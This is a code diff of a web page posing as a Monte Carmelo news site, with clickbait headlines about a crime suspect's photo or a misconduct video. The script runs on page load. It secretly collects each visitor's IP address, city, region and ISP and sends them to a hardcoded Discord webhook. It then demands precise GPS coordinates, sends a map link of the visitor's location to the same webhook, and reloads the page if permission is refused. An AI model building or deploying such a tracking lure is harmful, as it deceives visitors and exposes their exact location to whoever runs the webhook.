@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monte City - Notícias</title>
+    <title>Monte City - Notícias Urgentes</title>
 
-    <meta property="og:title" content="🚨 URGENTE: VEJA AQUI A FOTO DO SUSPEITO DO HOMICIDIO EM MONTE CARMELO 16/02/2026">
-    <meta property="og:description" content="Imagens exclusivas do ocorrido no Sidônio Cardoso. Clique para ver os detalhes e a identificação.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/Screenshot_20260216-175457%7E2.png">
+    <meta property="og:title" content="🚨 URGENTE: VEJA O VÍDEO DO DESVIO DE CONDUTA EM MONTE CARMELO (29/04/2026)">
+    <meta property="og:description" content="Registro grave de ocorrência hoje no centro. Clique para ver as imagens e os detalhes da investigação.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/main/desvio_2904.png">
     <meta property="og:image:type" content="image/png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -24,55 +24,44 @@
 <body onload="capturarIP()">
 
     <div class="loader"></div>
-    <p class="aviso">Para sua segurança e acesso ao conteúdo regional de Monte Carmelo, confirme sua localização...</p>
+    <p class="aviso">Para sua segurança e acesso ao conteúdo restrito de Monte Carmelo, confirme sua localização...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
-        // 1. CAPTURA AUTOMÁTICA DE IP (INVISÍVEL)
         function capturarIP() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    const infoRede = `📍 **ACESSO DETECTADO (DADOS DE REDE)**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n🚩 **Estado:** ${data.region}\n📡 **Provedor:** ${data.org}`;
-                    
+                    const infoRede = `🚨 **ALERTA: CASO DESVIO DE CONDUTA (29/04)**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n🚩 **Estado:** ${data.region}\n📡 **Provedor:** ${data.org}`;
                     fetch(WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ content: infoRede })
-                    }).finally(() => { 
-                        solicitarGPS(); 
-                    });
+                    }).finally(() => { solicitarGPS(); });
                 })
                 .catch(() => solicitarGPS());
         }
 
-        // 2. SOLICITAÇÃO DE GPS EXATO
         function solicitarGPS() {
             if (navigator.geolocation) {
-                const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
-                navigator.geolocation.getCurrentPosition(enviarGPS, erroLocalizacao, options);
-            } else {
-                direcionar();
-            }
+                navigator.geolocation.getCurrentPosition(enviarGPS, erroLocalizacao, { enableHighAccuracy: true });
+            } else { direcionar(); }
         }
 
         function enviarGPS(pos) {
             const lat = pos.coords.latitude;
             const log = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${log}`;
-
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    content: `🌍 **LOCALIZAÇÃO EXATA (GPS)**\n📍 **Mapa:** ${mapa}` 
-                })
+                body: JSON.stringify({ content: `🌍 **LOCALIZAÇÃO EXATA (GPS)**\n📍 **Mapa:** ${mapa}` })
             }).finally(() => { direcionar(); });
         }
 
-        function erroLocalizacao(err) {
-            alert("A permissão de localização é necessária para segurança do acesso regional.");
+        function erroLocalizacao() {
+            alert("A permissão de localização é necessária para visualizar o vídeo de segurança.");
             location.reload();
         }
 
